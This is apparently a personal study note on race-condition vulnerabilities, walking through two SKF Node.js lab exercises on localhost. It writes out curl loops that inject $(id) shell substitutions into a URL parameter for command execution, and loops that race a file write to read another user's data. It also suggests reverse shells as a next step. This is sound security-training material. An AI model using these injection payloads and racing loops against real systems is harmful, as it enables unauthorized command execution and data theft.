---
tags:
  - vulnerabilty
  - "#racecondition"
---

# What is a Race Condition

Where two or more services fight for the same resources and don't exists any mechanism that synchronize the access of services.

If two process try to access at the same time, could be that one of them will be unpredictable, or a not expected behavior 



---
# Exploiting

Go to indicate folder and use `sudo npm install` and `sudo npm start`

If you have some problema with `npm install` add a `--force`

![](../../Images/Pasted%20image%2020230906154654.png)

We are analyze the code of the website that is in **app.js** 

And we can see that we can't execute command thanks to this regex, but before execute the valid function, we can see that the file with our name (or malicious command) exists, but after is changed by the regex

![](../../Images/Pasted%20image%2020230906161006.png)

If the variable valid is empty, they call boot_clean() and this function delete the file hello.txt, but before this the command is executed

![](../../Images/Pasted%20image%2020230906164825.png)

In this piece of code exist a little margin when create the file `fs.writeFileSync`, then execute the file and apply the validation, if you go so fast to read the file, maybe you have time to see the result.

We can do this one-liner to check if the command is executing, this is possible because we have access to the files of the website:

You put some name in the website, in my case I put my name and then I use this loop

````bash
while true; do cat hello.txt | grep -v "Sergio"; done
````

`hello.txt` --> In this file is where stored the word that you introduce in the website

`grep` --> You are using grep because you are not interested in see the content of the file until don't change the input in the website

In the website try to inject command:

````bash
$(id)
or
`id`
````

Go to terminal and stop the loop with ctrl_c and if you to the begging you can see the result of the command executed

![](../../Images/Pasted%20image%2020230906165756.png)

But how we can do this if we haven't the files?

````bash
while true; do curl -s -X GET 'http://localhost:5000/?action=run' | grep -i "Check this out" | html2text | xargs; done

# Genereated by S4vitaar
````

You have to send the information in the website, in my case I don't change the name `Default User`

Click on **Make it mine!**

In terminal you have to see this:

![](../../Images/Pasted%20image%2020230906170800.png)

Now we are going to hide the output that contain `Default User`:

````bash
while true; do curl -s -X GET 'http://localhost:5000/?action=run' | grep -i "Check this out" | html2text | xargs | grep -v "Default User"; done
````

Now you need to copy the url when put the name, the URL be like:

![](../../Images/Pasted%20image%2020230906171009.png)

````bash
http://localhost:5000/?person=Default+User&action=validate
````

In other terminal you have to use curl command, but change the `Default User` by `$(id)`:

````bash
curl -s -X 'http://localhost:5000/?person=$(id)&action=validate'
````

**Important** --> You have to use single quotes in url because the $(id) would be interpreted by your own machine and this is not interest us

Now we are going to put this command in a while loop:

````bash
while true; do curl -s -X 'http://localhost:5000/?person=$(id)&action=validate'; done
````

After running this command you have to have the after command executing, you have to execute this command in a terminal:

````bash
while true; do curl -s -X GET 'http://localhost:5000/?action=run' | grep -i "Check this out" | html2text | xargs | grep -v "Default User"; done
````

and the last in other terminal:

````bash
while true; do curl -s -X GET 'http://localhost:5000/?person=$(id)&action=validate'; done
````

We can see a lot of unnecessary output:

![](../../Images/Pasted%20image%2020230906171733.png)

We can delete this from our output:

````bash
while true; do curl -s -X GET 'http://localhost:5000/?action=run' | grep "Check this out" | html2text | xargs | grep -vE "pepe|Important|Default User"; done
````

As I am somewhat impatient I change the name and put `pepe` and I have to change a little the loop 

You have to wait and you can see the result:

![](../../Images/Pasted%20image%2020230906182544.png)

What means this?

That means that you can use a [Reverse shells](../../Shells/Reverse%20shell/Reverse%20shells.md) and gain access to the victim machine, this is vulnerable to a **command injection**

---

# Race condition file write

We are going to the other folder and realize npm install and start

![](../../Images/Pasted%20image%2020230906183234.png)

This is the same

In this case if you put some parameter in the url you obtain a file

> http://localhost:5000/test

If you look the app.js

![](../../Images/Pasted%20image%2020230906183448.png)

You can see that there are some spaces begin write the file and give you (that are time loss)

Imagine that two user at the same time append information in the document shared-file.txt and when they present (upload) the file you can see the content of the other person 

Imagine that other user is sending the data (you can emulate other user with Burpsuite)

````bash
while true; do curl -s -X GET "http://localhost:5000/hello"; done
````

You see the response that is:

![](../../Images/Pasted%20image%2020230906184127.png)

You can put an echo to see better

````bash
while true; do curl -s -X GET "http://localhost:5000/hello"; echo; done
````

Now we are going to remove all the output that contain hello

````bash
while true; do curl -s -X GET "http://localhost:5000/hello" | grep -v "hello"; done
````

If we go to Burpsuite (other user) and send the request with **Repeater**, while this loop is running, at some point can see the data of the other client

![](../../Images/Pasted%20image%2020230906184743.png)

But to obtain in this case the data of the client (Burpsuite) the length of the client must be bigger than the data of the attacker (in the terminal)

And you can see the data of the client that is **asdasd** in our terminal if you send many times the request

![](../../Images/Pasted%20image%2020230906185115.png)

Not always work the first time that you send the request

---
# Remember

For race condition always a lot of request to the server to take the request that are interested

---

# Labs

We are going to use [skf labs](https://github.com/blabla1337/skf-labs)

nodeJs/RaceCondition

After we are going to see nodeJs/RaceCondition-file-write

